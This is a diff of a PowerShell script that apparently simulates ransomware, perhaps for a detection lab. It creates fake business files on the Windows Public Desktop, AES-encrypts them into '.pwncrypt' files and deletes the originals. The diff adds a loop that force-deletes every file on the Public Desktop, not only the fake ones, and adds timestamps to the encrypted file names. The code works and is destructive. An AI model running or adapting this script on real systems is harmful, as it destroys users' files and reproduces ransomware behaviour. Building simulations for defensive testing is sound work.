@@ -1,4 +1,4 @@
- # Define the Public Desktop path
+  # Define the Public Desktop path
 $publicDesktop = "C:\Users\Public\Desktop"
 
 # Define encryption key and IV (Initialization Vector) for AES
@@ -27,6 +27,15 @@ $fakeFiles = @{
     "CompanyFinancials.txt" = "Total Revenue: $10,000,000`nNet Profit: $1,000,000"
 }
 
+# Define the folder path
+$folderPath = "C:\Users\Public\Desktop"
+
+# Get all files in the folder
+Get-ChildItem -Path $folderPath -File | ForEach-Object {
+    # Remove each file
+    Remove-Item $_.FullName -Force
+}
+
 # Create fake text files, encrypt them, then delete the originals
 foreach ($file in $fakeFiles.Keys) {
     $filePath = Join-Path $publicDesktop $file
@@ -38,8 +47,11 @@ foreach ($file in $fakeFiles.Keys) {
     # Encrypt the file content
     $encryptedContent = Encrypt-Text $fakeContent $key $iv
 
+    # Get the current time
+    $epochTime = [int][double]::Parse((Get-Date -UFormat %s))
+
     # Define the path for the encrypted file with .pwncrypt extension
-    $encryptedFilePath = [System.IO.Path]::ChangeExtension($filePath, ".txt.pwncrypt")
+    $encryptedFilePath = [System.IO.Path]::ChangeExtension($filePath, "$($epochTime).txt.pwncrypt")
 
     # Write the encrypted content to the new file
     [System.IO.File]::WriteAllBytes($encryptedFilePath, $encryptedContent)
